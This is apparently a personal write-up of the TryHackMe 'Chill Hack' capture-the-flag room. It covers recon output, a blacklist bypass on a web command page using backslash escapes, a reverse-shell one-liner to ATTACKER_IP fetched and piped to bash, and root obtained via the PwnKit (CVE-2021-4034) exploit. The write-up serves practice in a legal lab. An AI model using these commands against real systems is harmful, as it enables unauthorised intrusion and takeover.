# Chill Hack

Notes on https://tryhackme.com/room/chillhack

## recon

### nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### gobuster

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://TARGET_IP/css/]
/fonts                (Status: 301) [Size: 314] [--> http://TARGET_IP/fonts/]
/images               (Status: 301) [Size: 315] [--> http://TARGET_IP/images/]
/js                   (Status: 301) [Size: 311] [--> http://TARGET_IP/js/]
/secret               (Status: 301) [Size: 315] [--> http://TARGET_IP/secret/]
/server-status        (Status: 403) [Size: 278]
```

### ftp
`└─# ftp TARGET_IP`

Get notes.txt:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### website

This section documents a lot of unsuccessful experimentation.

http://TARGET_IP/ doesn't have a working search bar.

http://TARGET_IP/secret/ opens a page where we can execute commands. Some are banned, some are allowed.


`dir ../../../../../../home`

```
anurodh apaar aurick 
```

`base64 /home/apaar/local.txt` nothing...

```
/usr/lib/openssh/ssh-keysign 
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic 
/usr/lib/snapd/snap-confine 
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/lib/eject/dmcrypt-get-device 
/usr/bin/sudo 
/usr/bin/newgidmap 
/usr/bin/gpasswd 
/usr/bin/newuidmap 
/usr/bin/traceroute6.iputils 
/usr/bin/newgrp 
/usr/bin/pkexec 
/usr/bin/passwd 
/usr/bin/at 
/usr/bin/chfn 
/usr/bin/chsh 
/bin/su 
/bin/mount 
/bin/fusermount 
/bin/ping 
/bin/umount 
```

```
Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: 

(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh 
```

`/home/apaar/.helpline.sh`

```
 Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time! 
```

`base64 /home/apaar/.helpline.sh` and copy and decode

```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

`l\s -la` bypass command filters.

`c\at index.php` then view source.

```
?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
				{?>
```

```
<?php echo shell_exec($cmd);?>
```

## gaining access

`└─# nc -nvlp 4242 `

`bash -i >& /dev/tcp/ATTACKER_IP/4242 0>&1` is put into file `rev`. Found from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Host a python webserver: `└─# python -m http.server`

Post `curl ATTACKER_IP:8000/rev | ba\sh` into http://TARGET_IP/secret

And get a reverse shell.


## privesc

No gcc.

Find ssh public key:

`www-data@ubuntu:/home/apaar/.ssh$ cat authorized_keys` 
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```

### linpease

https://linpeas.sh/

```
Sudo version 1.8.21p2                                                                                                                                                          

Vulnerable to CVE-2021-4034
```

### PwnKit

Download https://github.com/ly4k/PwnKit on attacker machine.

`└─# python -m http.server 9999`

On target: `www-data@ubuntu:/tmp$ wget ATTACKER_IP:9999/PwnKit`

`www-data@ubuntu:/tmp$ chmod +x PwnKit `

`www-data@ubuntu:/tmp$ ./PwnKit `

`root@ubuntu:/tmp# `

And that's it! We get root.
